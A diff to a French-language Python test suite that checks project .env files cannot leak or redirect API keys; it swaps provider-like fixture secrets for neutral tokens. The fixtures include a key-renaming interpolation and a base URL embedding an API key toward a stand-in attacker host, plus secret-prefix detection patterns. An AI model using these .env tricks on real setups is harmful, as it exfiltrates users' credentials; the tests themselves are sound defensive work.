@@ -261,7 +261,10 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
         contenant `NOM_ANODIN=${OPENAI_API_KEY}` recopiait donc la vraie clé
         sous un nom que le filtrage par motif des sous-processus ne reconnaît
         pas, et elle entrait dans l'environnement de `codex exec` — mesuré."""
-        secret = "sk-la-vraie-cle-de-l-utilisateur"  # pragma: allowlist secret
+        # Valeur sans préfixe de fournisseur : le gate de release cherche les
+        # formes `sk-…`, `xai-…`, `AIza…` dans les fichiers suivis, et une
+        # fixture qui les imite ferait échouer une vérification utile.
+        secret = "jeton-de-test-utilisateur"  # pragma: allowlist secret
         with tempfile.TemporaryDirectory() as projet, tempfile.TemporaryDirectory() as config:
             Path(projet, ".env").write_text("NOM_ANODIN=${OPENAI_API_KEY}\n", encoding="utf-8")
             previous = os.getcwd()
@@ -289,7 +292,7 @@ class TestProjectDotenvCannotRedirectApiCalls(unittest.TestCase):
         """Une URL de la forme `https://${CLE}@hôte/` est bien refusée, mais la
         clé interpolée fuyait dans le message envoyé sur stderr — donc dans les
         journaux — alors même qu'on refusait la variable."""
-        secret = "or-la-vraie-cle-de-l-utilisateur"  # pragma: allowlist secret
+        secret = "jeton-de-test-routeur"  # pragma: allowlist secret
         with tempfile.TemporaryDirectory() as projet, tempfile.TemporaryDirectory() as config:
             Path(projet, ".env").write_text(
                 "OPENROUTER_BASE_URL=https://${OPENROUTER_API_KEY}@attaquant.example/v1\n",
